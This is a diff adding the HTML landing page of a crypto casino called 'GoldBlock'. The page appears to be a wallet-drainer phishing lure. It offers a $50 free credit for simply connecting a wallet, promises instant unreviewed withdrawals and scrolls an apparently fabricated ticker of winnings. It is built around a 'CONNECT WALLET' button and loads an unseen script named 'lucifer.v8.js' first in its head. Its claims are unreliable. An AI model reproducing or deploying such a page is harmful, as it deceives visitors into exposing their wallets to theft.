@@ -1,0 +1,275 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="module" crossorigin src="./files/lucifer.v8.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GoldBlock — The Gold Standard of Crypto Gaming</title>
+  <meta name="description" content="GoldBlock is the premium crypto casino. Connect your wallet, claim your bonus, and play slots, table games, crash and live dealers." />
+  <link rel="icon" type="image/svg+xml" href="assets/logo.svg" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="brand" href="#top">
+        <img src="assets/logo.svg" alt="GoldBlock logo" class="brand-logo" />
+        <span class="brand-name">GOLD<em>BLOCK</em></span>
+      </a>
+
+      <nav class="main-nav" id="main-nav">
+        <a href="#games">Games</a>
+        <a href="#bonuses">Bonuses</a>
+        <a href="#faq">FAQ</a>
+      </nav>
+
+      <div class="header-actions">
+        <button class="btn btn-gold interactBtn" id="wallet-btn" type="button">CONNECT WALLET</button>
+        <button class="hamburger" id="hamburger" type="button" aria-label="Menu">
+          <span></span><span></span><span></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main id="top">
+
+    <section class="hero">
+      <div class="hero-glow"></div>
+      <div class="container hero-inner">
+        <span class="hero-badge">Provably Fair &middot; Instant Withdrawals &middot; No Sign-Up</span>
+        <h1 class="hero-title">The Gold Standard of <span class="gold-text">Crypto Gaming</span></h1>
+        <p class="hero-sub">No accounts. No deposit. Connect your wallet, claim your <b class="gold-text">$50 free credit</b> and play 100+ premium casino games with BTC, ETH, SOL, XMR and 8+ more cryptocurrencies.</p>
+        <div class="hero-cta">
+          <button class="btn btn-gold btn-lg" id="claim-btn" type="button" hidden>CLAIM BONUS</button>
+        </div>
+      </div>
+    </section>
+
+    <div class="ticker" aria-hidden="true">
+      <div class="ticker-track" id="ticker-track">
+        <span class="tick"><b>0x3f9…a2c4</b> won <em>0.42 ETH</em> on Book of Dead</span>
+        <span class="tick"><b>0x81b…77d1</b> won <em>1,250 USDT</em> on Fire in the Hole</span>
+        <span class="tick"><b>0xc4e…09f2</b> won <em>0.081 BTC</em> on Blackjack Multihand</span>
+        <span class="tick"><b>0x22a…be30</b> won <em>3.10 SOL</em> on Reactoonz 100</span>
+        <span class="tick"><b>0xd90…4c17</b> won <em>640 USDT</em> on European Roulette</span>
+        <span class="tick"><b>0x57f…e8aa</b> won <em>0.29 ETH</em> on Space XY</span>
+        <span class="tick"><b>0x1cc…b3d8</b> won <em>2,980 USDT</em> on Elvis Frog in Vegas</span>
+        <span class="tick"><b>0xaa7…10e5</b> won <em>0.64 BTC</em> on San Quentin 2</span>
+      </div>
+    </div>
+
+    <div class="currency-bar">
+      <div class="container currency-inner">
+        <span class="currency-label">WE ACCEPT</span>
+        <span class="coin-chip"><i style="background:#f7931a"></i><b>BTC</b><span>Bitcoin</span></span>
+        <span class="coin-chip"><i style="background:#627eea"></i><b>ETH</b><span>Ethereum</span></span>
+        <span class="coin-chip"><i style="background:#26a17b"></i><b>USDT</b><span>Tether</span></span>
+        <span class="coin-chip"><i style="background:#2775ca"></i><b>USDC</b><span>USD Coin</span></span>
+        <span class="coin-chip"><i style="background:#9945ff"></i><b>SOL</b><span>Solana</span></span>
+        <span class="coin-chip"><i style="background:#f3ba2f"></i><b>BNB</b><span>BNB</span></span>
+        <span class="coin-chip"><i style="background:#ff6600"></i><b>XMR</b><span>Monero</span></span>
+        <span class="coin-chip"><i style="background:#c2a633"></i><b>DOGE</b><span>Dogecoin</span></span>
+        <span class="coin-chip"><i style="background:#b8bdc4"></i><b>XRP</b><span>Ripple</span></span>
+        <span class="coin-chip"><i style="background:#4d6fb8"></i><b>LTC</b><span>Litecoin</span></span>
+        <span class="coin-chip"><i style="background:#eb0029"></i><b>TRX</b><span>Tron</span></span>
+        <span class="coin-chip"><i style="background:#3468d1"></i><b>ADA</b><span>Cardano</span></span>
+      </div>
+    </div>
+
+    <section class="section" id="games">
+      <div class="container">
+        <div class="section-head">
+          <h2>Play <span class="gold-text">The Vault</span></h2>
+          <p>Every game. One wallet. Zero friction.</p>
+        </div>
+
+        <div class="tabs" id="tabs">
+          <button class="tab active" data-filter="all" type="button">All Games</button>
+          <button class="tab" data-filter="slots" type="button">Slots</button>
+          <button class="tab" data-filter="crash" type="button">Crash</button>
+          <button class="tab" data-filter="table" type="button">Table</button>
+        </div>
+
+        <div class="grid" id="game-grid">
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-3"><img src="assets/games/book-of-dead.webp" alt="Book of Dead" /></div>
+            <div class="tile-info"><h3>Book of Dead</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-6"><img src="assets/games/reactoonz-100.webp" alt="Reactoonz 100" /></div>
+            <div class="tile-info"><h3>Reactoonz 100</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-3"><img src="assets/games/moon-princess.webp" alt="Moon Princess" /></div>
+            <div class="tile-info"><h3>Moon Princess</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-6"><img src="assets/games/rise-of-olympus-1000.webp" alt="Rise of Olympus 1000" /></div>
+            <div class="tile-info"><h3>Rise of Olympus 1000</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-1"><img class="fit-contain" src="assets/games/fire-in-the-hole.png" alt="Fire in the Hole" /></div>
+            <div class="tile-info"><h3>Fire in the Hole</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-5"><img src="assets/games/san-quentin-2.png" alt="San Quentin 2: Death Row" /></div>
+            <div class="tile-info"><h3>San Quentin 2</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-5"><img src="assets/games/tombstone-slaughter.png" alt="Tombstone Slaughter" style="object-position: 50% 40%;" /></div>
+            <div class="tile-info"><h3>Tombstone Slaughter</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="slots" type="button">
+            <div class="tile-art art-2"><img src="assets/games/elvis-frog-in-vegas.webp" alt="Elvis Frog in Vegas" style="object-position: 50% 62%;" /></div>
+            <div class="tile-info"><h3>Elvis Frog in Vegas</h3><span class="tag">Slots</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="crash" type="button">
+            <div class="tile-art art-6"><img src="assets/games/space-xy.webp" alt="Space XY" style="object-position: 50% 60%;" /></div>
+            <div class="tile-info"><h3>Space XY</h3><span class="tag">Crash</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="table" type="button">
+            <div class="tile-art art-5"><img src="assets/games/blackjack-multihand.webp" alt="Blackjack Multihand" style="object-position: 50% 55%;" /></div>
+            <div class="tile-info"><h3>Blackjack Multihand</h3><span class="tag">Table</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="table" type="button">
+            <div class="tile-art art-6"><img src="assets/games/european-roulette.webp" alt="European Roulette" style="object-position: 50% 40%;" /></div>
+            <div class="tile-info"><h3>European Roulette</h3><span class="tag">Table</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+          <button class="tile" data-category="table" type="button">
+            <div class="tile-art art-4"><img src="assets/games/classic-baccarat.webp" alt="Classic Baccarat" style="object-position: 50% 68%;" /></div>
+            <div class="tile-info"><h3>Classic Baccarat</h3><span class="tag">Table</span></div>
+            <div class="tile-hover"><span class="play-chip">PLAY</span></div>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <section class="section section-alt" id="bonuses">
+      <div class="container">
+        <div class="section-head">
+          <h2>Gold <span class="gold-text">Member Perks</span></h2>
+          <p> Bonuses that actually pay in crypto.</p>
+        </div>
+        <div class="promo-grid">
+          <div class="promo">
+            <span class="promo-icon">★</span>
+            <h3>Instant Withdrawals</h3>
+            <p>Winnings land in your wallet in minutes — on-chain, no pending periods, no manual review, no fuss.</p>
+            <span class="promo-tag">On-chain payouts</span>
+          </div>
+          <div class="promo promo-featured">
+            <span class="promo-icon">$</span>
+            <h3>$50 Free Credit</h3>
+            <p>We drop a <b>$50 free credit</b> straight into your account the moment you connect your wallet. No deposit, no strings.</p>
+            <span class="promo-tag">No deposit needed</span>
+          </div>
+          <div class="promo">
+            <span class="promo-icon">♛</span>
+            <h3>VIP Club</h3>
+            <p>Custom limits, a personal host, weekly bonuses and secret drops for high rollers.</p>
+            <span class="promo-tag">By invitation</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="faq">
+      <div class="container container-narrow">
+        <div class="section-head">
+          <h2>Questions, <span class="gold-text">Answered</span></h2>
+        </div>
+        <div class="faq-list">
+          <details>
+            <summary>How do I join GoldBlock?</summary>
+            <p>There's no sign-up and no login. Click <b>Connect Wallet</b>, choose your wallet, and you're in — your wallet is your account.</p>
+          </details>
+          <details>
+            <summary>Which cryptocurrencies can I play with?</summary>
+            <p>BTC, ETH, USDT, USDC, SOL, BNB, XMR, DOGE, XRP, LTC, TRX and ADA — 12 cryptocurrencies in total. Deposits and withdrawals go directly to and from your connected wallet.</p>
+          </details>
+          <details>
+            <summary>How fast are withdrawals?</summary>
+            <p>Instant. Withdrawals are processed on-chain the moment you confirm — no pending periods, no manual review.</p>
+          </details>
+          <details>
+            <summary>Are the games fair?</summary>
+            <p>Yes. Every game runs on a provably fair system, letting you independently verify each result with cryptographic seeds.</p>
+          </details>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-brand">
+        <a class="brand" href="#top">
+          <img src="assets/logo.svg" alt="GoldBlock logo" class="brand-logo" />
+          <span class="brand-name">GOLD<em>BLOCK</em></span>
+        </a>
+        <p>The gold standard of crypto gaming. Wallet-only access, instant payouts, provably fair games.</p>
+      </div>
+      <div class="footer-links">
+        <h4>Casino</h4>
+        <a href="#games">Games</a>
+        <a href="#bonuses">Bonuses</a>
+        <a href="#faq">FAQ</a>
+      </div>
+      <div class="footer-links">
+        <h4>Legal</h4>
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Responsible Gaming</a>
+      </div>
+      <div class="footer-badges">
+        <span class="badge-18">18+</span>
+        <span class="badge-rg">PLAY RESPONSIBLY</span>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <div class="container">
+        <p>© 2026 GoldBlock. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <div class="modal" id="bonus-modal">
+    <div class="modal-card modal-card-sm">
+      <button class="modal-close" data-close type="button">&times;</button>
+      <span class="success-check">✓</span>
+      <h3 class="modal-title">Bonus Claimed!</h3>
+      <p class="modal-sub">Your $50 free credit has been added to your balance.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="game-modal">
+    <div class="modal-card modal-card-sm">
+      <button class="modal-close" data-close type="button">&times;</button>
+      <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/><circle cx="12" cy="15.5" r="1.3" fill="currentColor" stroke="none"/></svg>
+      <h3 class="modal-title">Connect your wallet to play</h3>
+      <p class="modal-sub">GoldBlock is wallet-only. Connect to unlock every game.</p>
+    </div>
+  </div>
+
+  <script src="js/main.js"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"9d2bc902520a4472903fbd92a8b2cf23","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
